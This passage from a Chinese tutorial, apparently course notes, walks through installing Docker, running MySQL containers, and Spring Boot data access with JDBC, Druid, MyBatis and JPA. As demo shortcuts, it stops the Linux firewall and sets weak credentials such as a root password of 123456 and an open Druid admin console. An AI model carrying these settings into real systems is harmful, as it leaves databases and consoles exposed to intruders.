id="2-在linux虚拟机上安装docker">2）、在linux虚拟机上安装docker</span></h4><p>步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、检查内核版本，必须是3.10及以上</span><br><span class="line">uname -r</span><br><span class="line">2、安装docker</span><br><span class="line">yum install docker</span><br><span class="line">3、输入y确认安装</span><br><span class="line">4、启动docker</span><br><span class="line">[root@localhost ~]# systemctl start docker</span><br><span class="line">[root@localhost ~]# docker -v</span><br><span class="line">Docker version 1.12.6, build 3e8e77d/1.12.6</span><br><span class="line">5、开机启动docker</span><br><span class="line">[root@localhost ~]# systemctl enable docker</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</span><br><span class="line">6、停止docker</span><br><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure><h2><span id="4-docker常用命令amp操作">4、Docker常用命令&amp;操作</span></h2><h3><span id="1-镜像操作">1）、镜像操作</span></h3><table><thead><tr><th>操作</th><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>检索</td><td>docker  search 关键字  eg：docker  search redis</td><td>我们经常去docker  hub上检索镜像的详细信息，如镜像的TAG。</td></tr><tr><td>拉取</td><td>docker pull 镜像名:tag</td><td>:tag是可选的，tag表示标签，多为软件的版本，默认是latest</td></tr><tr><td>列表</td><td>docker images</td><td>查看所有本地镜像</td></tr><tr><td>删除</td><td>docker rmi image-id</td><td>删除指定的本地镜像</td></tr></tbody></table><p><a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a></p><h3><span id="2-容器操作">2）、容器操作</span></h3><p>软件镜像（QQ安装程序）—-运行镜像—-产生一个容器（正在运行的软件，运行的QQ）；</p><p>步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1、搜索镜像</span><br><span class="line">[root@localhost ~]# docker search tomcat</span><br><span class="line">2、拉取镜像</span><br><span class="line">[root@localhost ~]# docker pull tomcat</span><br><span class="line">3、根据镜像启动容器</span><br><span class="line">docker run --name mytomcat -d tomcat:latest</span><br><span class="line">4、docker ps  </span><br><span class="line">查看运行中的容器</span><br><span class="line">5、 停止运行中的容器</span><br><span class="line">docker stop  容器的id</span><br><span class="line">6、查看所有的容器</span><br><span class="line">docker ps -a</span><br><span class="line">7、启动容器</span><br><span class="line">docker start 容器id</span><br><span class="line">8、删除一个容器</span><br><span class="line"> docker rm 容器id</span><br><span class="line">9、启动一个做了端口映射的tomcat</span><br><span class="line">[root@localhost ~]# docker run -d -p 8888:8080 tomcat</span><br><span class="line">-d：后台运行</span><br><span class="line">-p: 将主机的端口映射到容器的一个端口    主机端口:容器内部的端口</span><br><span class="line"></span><br><span class="line">10、为了演示简单关闭了linux的防火墙</span><br><span class="line">service firewalld status ；查看防火墙状态</span><br><span class="line">service firewalld stop：关闭防火墙</span><br><span class="line">11、查看容器的日志</span><br><span class="line">docker logs container-name/container-id</span><br><span class="line"></span><br><span class="line">更多命令参看</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/docker/</span><br><span class="line">可以参考每一个镜像的文档</span><br></pre></td></tr></table></figure><h3><span id="3-安装mysql示例">3）、安装MySQL示例</span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql</span><br></pre></td></tr></table></figure><p>错误的启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name mysql01 -d mysql</span><br><span class="line">42f09819908bb72dd99ae19e792e0a5d03c48638421fa64cce5f8ba0f40f5846</span><br><span class="line"></span><br><span class="line">mysql退出了</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                           PORTS               NAMES</span><br><span class="line">42f09819908b        mysql               "docker-entrypoint.sh"   34 seconds ago      Exited (1) 33 seconds ago                            mysql01</span><br><span class="line">538bde63e500        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       compassionate_</span><br><span class="line">goldstine</span><br><span class="line">c4f1ac60b3fc        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       lonely_fermi</span><br><span class="line">81ec743a5271        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       sick_ramanujan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//错误日志</span><br><span class="line">[root@localhost ~]# docker logs 42f09819908b</span><br><span class="line">error: database is uninitialized and password option is not specified </span><br><span class="line">  You need to specify one of MYSQL_ROOT_PASSWORD, MYSQL_ALLOW_EMPTY_PASSWORD and MYSQL_RANDOM_ROOT_PASSWORD；这个三个参数必须指定一个</span><br></pre></td></tr></table></figure><p>正确的启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name mysql01 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br><span class="line">b874c56bec49fb43024b3805ab51e9097da779f2f572c22c695305dedd684c5f</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">b874c56bec49        mysql               "docker-entrypoint.sh"   4 seconds ago       Up 3 seconds        3306/tcp            mysql01</span><br></pre></td></tr></table></figure><p>做了端口映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run -p 3306:3306 --name mysql02 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br><span class="line">ad10e4bc5c6a0f61cbad43898de71d366117d120e39db651844c0e73863b9434</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">ad10e4bc5c6a        mysql               "docker-entrypoint.sh"   4 seconds ago       Up 2 seconds        0.0.0.0:3306-&gt;3306/tcp   mysql02</span><br></pre></td></tr></table></figure><p>几个其他的高级操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mysql03 -v &#x2F;conf&#x2F;mysql:&#x2F;etc&#x2F;mysql&#x2F;conf.d -e MYSQL_ROOT_PASSWORD&#x3D;my-secret-pw -d mysql:tag</span><br><span class="line">把主机的&#x2F;conf&#x2F;mysql文件夹挂载到 mysqldocker容器的&#x2F;etc&#x2F;mysql&#x2F;conf.d文件夹里面</span><br><span class="line">改mysql的配置文件就只需要把mysql配置文件放在自定义的文件夹下（&#x2F;conf&#x2F;mysql）</span><br><span class="line"></span><br><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD&#x3D;my-secret-pw -d mysql:tag --character-set-server&#x3D;utf8mb4 --collation-server&#x3D;utf8mb4_unicode_ci</span><br><span class="line">指定mysql的一些配置参数</span><br></pre></td></tr></table></figure><h1><span id="六-springboot与数据访问">六、SpringBoot与数据访问</span></h1><h2><span id="1-jdbc">1、JDBC</span></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://192.168.15.22:3306/jdbc</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure><p>效果：</p><p>​    默认是用org.apache.tomcat.jdbc.pool.DataSource作为数据源；</p><p>​    数据源的相关配置都在DataSourceProperties里面；</p><p>自动配置原理：</p><p>org.springframework.boot.autoconfigure.jdbc：</p><p>1、参考DataSourceConfiguration，根据配置创建数据源，默认使用Tomcat连接池；可以使用spring.datasource.type指定自定义的数据源类型；</p><p>2、SpringBoot默认可以支持；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.jdbc.pool.DataSource、HikariDataSource、BasicDataSource、</span><br></pre></td></tr></table></figure><p>3、自定义数据源类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generic DataSource configuration.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span>(DataSource<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnProperty</span>(<span class="title">name</span> </span>= <span class="string">"spring.datasource.type"</span>)</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Generic</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> DataSource <span class="title">dataSource</span><span class="params">(DataSourceProperties properties)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//使用DataSourceBuilder创建数据源，利用反射创建响应type的数据源，并且绑定相关属性</span></span><br><span class="line">      <span class="keyword">return</span> properties.initializeDataSourceBuilder().build();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、<strong>DataSourceInitializer：ApplicationListener</strong>；</p><p>​    作用：</p><p>​        1）、runSchemaScripts();运行建表语句；</p><p>​        2）、runDataScripts();运行插入数据的sql语句；</p><p>默认只需要将文件命名为：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">schema-*.sql、data-*.sql</span></span><br><span class="line"><span class="attr">默认规则：schema.sql，schema-all.sql；</span></span><br><span class="line"><span class="meta">可以使用</span>   <span class="string"></span></span><br><span class="line"><span class="attr">schema</span>:<span class="string"></span></span><br><span class="line">      <span class="meta">-</span> <span class="string">classpath:department.sql</span></span><br><span class="line">      <span class="attr">指定位置</span></span><br></pre></td></tr></table></figure><p>5、操作数据库：自动配置了JdbcTemplate操作数据库</p><h2><span id="2-整合druid数据源">2、整合Druid数据源</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">导入druid数据源</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DruidConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.datasource"</span>)</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">druid</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">return</span>  <span class="keyword">new</span> DruidDataSource();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//配置Druid的监控</span></span><br><span class="line">    <span class="comment">//1、配置一个管理后台的Servlet</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletRegistrationBean <span class="title">statViewServlet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ServletRegistrationBean bean = <span class="keyword">new</span> ServletRegistrationBean(<span class="keyword">new</span> StatViewServlet(), <span class="string">"/druid/*"</span>);</span><br><span class="line">        Map&lt;String,String&gt; initParams = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        initParams.put(<span class="string">"loginUsername"</span>,<span class="string">"admin"</span>);</span><br><span class="line">        initParams.put(<span class="string">"loginPassword"</span>,<span class="string">"123456"</span>);</span><br><span class="line">        initParams.put(<span class="string">"allow"</span>,<span class="string">""</span>);<span class="comment">//默认就是允许所有访问</span></span><br><span class="line">        initParams.put(<span class="string">"deny"</span>,<span class="string">"192.168.15.21"</span>);</span><br><span class="line"></span><br><span class="line">        bean.setInitParameters(initParams);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2、配置一个web监控的filter</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FilterRegistrationBean <span class="title">webStatFilter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FilterRegistrationBean bean = <span class="keyword">new</span> FilterRegistrationBean();</span><br><span class="line">        bean.setFilter(<span class="keyword">new</span> WebStatFilter());</span><br><span class="line"></span><br><span class="line">        Map&lt;String,String&gt; initParams = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        initParams.put(<span class="string">"exclusions"</span>,<span class="string">"*.js,*.css,/druid/*"</span>);</span><br><span class="line"></span><br><span class="line">        bean.setInitParameters(initParams);</span><br><span class="line"></span><br><span class="line">        bean.setUrlPatterns(Arrays.asList(<span class="string">"/*"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="3-整合mybatis">3、整合MyBatis</span></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180305194443.png" alt></p><p>步骤：</p><p>​    1）、配置数据源相关属性（见上一节Druid）</p><p>​    2）、给数据库建表</p><p>​    3）、创建JavaBean</p><h3><span id="4-注解版">4）、注解版</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指定这是一个操作数据库的mapper</span></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DepartmentMapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select</span>(<span class="string">"select * from department where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Department <span class="title">getDeptById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Delete</span>(<span class="string">"delete from department where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deleteDeptById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Options</span>(useGeneratedKeys = <span class="keyword">true</span>,keyProperty = <span class="string">"id"</span>)</span><br><span class="line">    <span class="meta">@Insert</span>(<span class="string">"insert into department(departmentName) values(#&#123;departmentName&#125;)"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">insertDept</span><span class="params">(Department department)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update</span>(<span class="string">"update department set departmentName=#&#123;departmentName&#125; where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">updateDept</span><span class="params">(Department department)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题：</p><p>自定义MyBatis的配置规则；给容器中添加一个ConfigurationCustomizer；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@org</span>.springframework.context.annotation.Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ConfigurationCustomizer <span class="title">configurationCustomizer</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ConfigurationCustomizer()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(Configuration configuration)</span> </span>&#123;</span><br><span class="line">                configuration.setMapUnderscoreToCamelCase(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用MapperScan批量扫描所有的Mapper接口；</span><br><span class="line"><span class="meta">@MapperScan</span>(value = <span class="string">"com.atguigu.springboot.mapper"</span>)</span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringBoot06DataMybatisApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">SpringApplication.run(SpringBoot06DataMybatisApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="5-配置文件版">5）、配置文件版</span></h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">config-location:</span> <span class="string">classpath:mybatis/mybatis-config.xml</span> <span class="string">指定全局配置文件的位置</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mybatis/mapper/*.xml</span>  <span class="string">指定sql映射文件的位置</span></span><br></pre></td></tr></table></figure><p>更多使用参照</p><p><a href="http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/" target="_blank" rel="noopener">http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/</a></p><h2><span id="4-整合springdata-jpa">4、整合SpringData JPA</span></h2><h3><span id="1-springdata简介">1）、SpringData简介</span></h3><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306105412.png" alt></p><h3><span id="2-整合springdata-jpa">2）、整合SpringData JPA</span></h3><p>JPA:ORM（Object Relational Mapping）；</p><p>1）、编写一个实体类（bean）和数据表进行映射，并且配置好映射关系；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用JPA注解配置映射关系</span></span><br><span class="line"><span class="meta">@Entity</span> <span class="comment">//告诉JPA这是一个实体类（和数据表映射的类）</span></span><br><span class="line"><span class="meta">@Table</span>(name = <span class="string">"tbl_user"</span>) <span class="comment">//@Table来指定和哪个数据表对应;如果省略默认表名就是user；</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">//这是一个主键</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span>(strategy = GenerationType.IDENTITY)<span class="comment">//自增主键</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column</span>(name = <span class="string">"last_name"</span>,length = <span class="number">50</span>) <span class="comment">//这是和数据表对应的一个列</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="meta">@Column</span> <span class="comment">//省略默认列名就是属性名</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br></pre></td></tr></table></figure><p>2）、编写一个Dao接口来操作实体类对应的数据表（Repository）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承JpaRepository来完成对数据库的操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">User</span>,<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）、基本的配置JpaProperties</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span>  </span><br><span class="line"> <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line"><span class="comment">#     更新或者创建数据表结构</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line"><span class="comment">#    控制台显示SQL</span></span><br><span class="line">    <span class="attr">show-sql:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1><span id="七-启动配置原理">七、启动配置原理</span></h1><p>几个重要的事件回调机制</p><p>配置在META-INF/spring.factories</p><p><strong>ApplicationContextInitializer</strong></p><p><strong>SpringApplicationRunListener</strong></p><p>只需要放在ioc容器中</p><p><strong>ApplicationRunner</strong></p><p><strong>CommandLineRunner</strong></p><p>启动流程：</p><h2><span id="1-创建springapplication对象"><strong>1、创建SpringApplication对象</strong></span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">initialize(sources);</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(Object[] sources)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//保存主配置类</span></span><br><span class="line">    <span class="keyword">if</span> (sources != <span class="keyword">null</span> &amp;&amp; sources.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.sources.addAll(Arrays.asList(sources));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断当前是否一个web应用</span></span><br><span class="line">    <span class="keyword">this</span>.webEnvironment = deduceWebEnvironment();</span><br><span class="line">    <span class="comment">//从类路径下找到META-INF/spring.factories配置的所有ApplicationContextInitializer；然后保存起来</span></span><br><span class="line">    setInitializers((Collection) getSpringFactoriesInstances(</span><br><span class="line">        ApplicationContextInitializer<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">    <span class="comment">//从类路径下找到ETA-INF/spring.factories配置的所有ApplicationListener</span></span><br><span class="line">    setListeners((Collection) getSpringFactoriesInstances(ApplicationListener<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">    <span class="comment">//从多个配置类中找到有main方法的主配置类</span></span><br><span class="line">    <span class="keyword">this</span>.mainApplicationClass = deduceMainApplicationClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306145727.png" alt></p><p><img 